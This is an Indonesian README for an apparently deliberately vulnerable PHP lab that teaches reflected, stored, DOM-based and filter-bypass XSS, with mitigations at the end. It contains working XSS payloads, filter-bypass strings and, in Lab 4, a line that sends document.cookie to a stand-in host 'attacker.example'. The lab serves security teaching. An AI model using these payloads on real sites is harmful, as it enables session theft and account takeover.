# XSS (Cross-Site Scripting) Lab

Aplikasi PHP sederhana yang sengaja rentan terhadap berbagai jenis XSS mengikuti kategori
PortSwigger Web Security Academy: **Reflected**, **Stored**, dan **DOM-based**, pada berbagai
konteks output (HTML body, atribut HTML, string JavaScript, header HTTP).

| Lab | Kategori | File | Sink / Konteks |
|---|---|---|---|
| 1 | Reflected XSS | `lab1_reflected.php` | HTML body |
| 2 | Reflected XSS | `lab2_reflected_attribute.php` | Atribut HTML (`value="..."`) |
| 3 | Reflected XSS | `lab3_reflected_js.php` | String literal JavaScript inline |
| 4 | Stored XSS | `lab4_stored_comments.php` | Guestbook, disimpan ke file JSON |
| 5 | DOM-based XSS | `lab5_dom_xss.php` | `location.hash` &rarr; `innerHTML` (client-side) |
| 6 | XSS + filter bypass | `lab6_filter_bypass.php` | Filter blacklist naif |
| 7 | Reflected XSS (header) | `lab7_useragent.php` | Header `User-Agent` |

> ⚠️ **PERINGATAN**: Aplikasi ini sengaja rentan. Jangan deploy ke server publik / internet.
> Jalankan hanya di jaringan lab/lokal yang terisolasi.

## Menjalankan

> Lab ini adalah bagian dari satu stack terpadu. Jalankan dari **root repo** (bukan dari
> folder ini), lihat [README.md utama](../README.md) untuk portal navigasinya.

```bash
cd ..            # ke root repo
docker compose up -d --build
```

Buka langsung `http://localhost:8079/xss/`, atau lewat Portal di `http://localhost:8079/` →
kategori **A05: Injection** → **Cross-Site Scripting (XSS)**.

> Semua akses lewat `gateway` (login Basic Auth, satu port untuk semua lab) — lihat
> [README.md utama](../README.md) bagian "Menjalankan (lokal)" untuk cara generate
> kredensialnya. Login cukup sekali, berlaku juga untuk lab SQLi/Command Injection.

Untuk mematikan semuanya dan menghapus data komentar tersimpan (dari root repo):

```bash
docker compose down -v
```

## Panduan tiap lab

### Lab 1 — Reflected XSS (HTML body)
```
http://localhost:8079/xss/lab1_reflected.php?q=<script>alert(document.domain)</script>
http://localhost:8079/xss/lab1_reflected.php?q=<img src=x onerror=alert(1)>
```

### Lab 2 — Reflected XSS (atribut HTML)
Payload disisipkan di dalam `value="..."`. Harus keluar dari atribut dulu:
```
?color="><script>alert(1)</script>
?color=" onmouseover="alert(1)
```
Untuk contoh kedua, submit lalu arahkan kursor mouse ke kotak input untuk memicu event.

### Lab 3 — Reflected XSS (konteks JavaScript)
Aplikasi meng-escape tanda kutip ganda, tapi tidak menutup tag `<script>`:
```
?name=</script><script>alert(1)</script>
?name=\";alert(1);//
```
Payload kedua memakai backslash untuk menetralkan escaping kutip milik aplikasi.

### Lab 4 — Stored XSS (guestbook)
Kirim komentar berikut lewat form, lalu buka ulang halamannya (atau minta peserta lain
membuka halaman yang sama):
```
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
```
Diskusikan dampaknya jika ini adalah dashboard admin yang membaca komentar/tiket dari user.

### Lab 5 — DOM-based XSS
Payload ada di **fragment URL** (`#...`), tidak pernah dikirim ke server:
```
http://localhost:8079/xss/lab5_dom_xss.php#<img src=x onerror=alert(document.domain)>
```
Perhatikan bahwa payload ini tidak akan pernah muncul di access log server — jelaskan kenapa
DOM-based XSS butuh pendekatan analisis source-to-sink pada JavaScript, bukan hanya cek server.

### Lab 6 — Filter bypass
Filter hanya menghapus string persis `<script>` (case-sensitive). Coba:
```
?input=<ScRiPt>alert(1)</ScRiPt>
?input=<img src=x onerror=alert(1)>
?input=<svg onload=alert(1)>
?input=<scr<script>ipt>alert(1)</scr<script>ipt>
```

### Lab 7 — Reflected XSS via header
```bash
curl -A "<script>alert(document.domain)</script>" http://localhost:8079/xss/lab7_useragent.php
```
Atau ubah User-Agent lewat DevTools (Network conditions / Sensors) di browser lalu reload.

## Mitigasi (untuk didiskusikan setelah lab)
- **Contextual output encoding**: `htmlspecialchars()` untuk HTML body & atribut,
  `json_encode()` untuk menyisipkan data ke JavaScript, bukan concatenation manual.
- **Content-Security-Policy** header untuk membatasi eksekusi inline script.
- **HttpOnly** cookie flag agar `document.cookie` tidak bisa dibaca lewat XSS (Lab 4).
- Untuk DOM-based (Lab 5): audit sink berbahaya (`innerHTML`, `document.write`, `eval`) dan
  gunakan `textContent` / API DOM yang aman, atau sanitizer seperti DOMPurify bila HTML memang
  diperlukan.
- Filter blacklist (Lab 6) selalu bisa dilewati — gunakan encoding berbasis konteks atau
  allowlist, bukan pemblokiran string.
